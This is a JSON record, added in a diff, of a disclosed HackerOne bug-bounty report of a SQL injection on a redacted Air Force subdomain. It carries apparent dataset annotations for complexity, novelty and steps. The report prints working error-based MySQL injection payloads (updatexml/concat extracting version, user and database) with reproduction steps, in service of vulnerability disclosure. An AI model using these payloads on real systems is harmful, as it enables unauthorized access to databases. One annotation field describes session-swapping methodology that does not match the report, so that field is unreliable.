@@ -1,0 +1,46 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "cdl ",
+    "title": "SQL Injection on \u2588\u2588\u2588\u2588\u2588",
+    "content": "\nBackground:\nIt looks like the patch for #231338 has been reverted and this subdomain is yet again vulnerable to SQL injection.\nSummary:\nAn Airforce subdomain is vulnerable to SQL Injection because the application does not produce sufficient validation on user input. This allows an attacker to execute SQL queries.\nDescription:\nThe \u2588\u2588\u2588= parameter on https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 does not properly sanitize ' characters, allowing an attacker to execute SQL queries!\nImpact\nThis could potentially expose sensitive information because an attacker could potentially dump the databases on this server!\nStep-by-step Reproduction Instructions\n1.) Open Firefox or any browser\n2.) Visit https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=' and updatexml(null,concat(0x0a,version()),null)-- -@hackerone.mil\n3.) You will see the MySQL version in the response => \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nUser - \u2588\u2588\u2588\u2588\u2588\u2588\u2588\npayload => https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=' and updatexml(null,concat(0x0a,user()),null)-- -@hackerone.mil\nDatabase - \u2588\u2588\u2588\u2588\npayload => https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=%27%20and%20updatexml(null,concat(0x0a,database()),null)--%20-@hackerone.mil\n\u2588\u2588\u2588\u2588\u2588\u2588\n### Suggested Mitigation/Remediation Actions\nSanitize input!\nThanks!\nCorben Douglas @sxcurity\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "SQL Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1652399820,
+    "report_url": "https://hackerone.com/reports/277380",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Open Firefox or any browser"
+        ],
+        [
+            2,
+            "Visit the vulnerable URL with a SQL injection payload like: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=' and updatexml(null,concat(0x0a,version()),null)-- -@hackerone.mil"
+        ],
+        [
+            3,
+            "Observe the MySQL version or other database information in the response"
+        ]
+    ],
+    "vuln_description": "The vulnerability is a SQL injection on a subdomain where user input is not properly sanitized, allowing an attacker to execute arbitrary SQL queries. This can lead to unauthorized access to sensitive database information.",
+    "reason": "The attack is straightforward and involves a common SQL injection technique without requiring complex interactions or multiple components. The vulnerability is easily detectable by testing for SQL injection using standard payloads.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": "231338",
+    "authnz_metadata": {
+        "reason": "The SQL injection vulnerability involves improper input sanitization, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions or resource IDs, not on input validation flaws.",
+        "is_detectable": false
+    }
+}
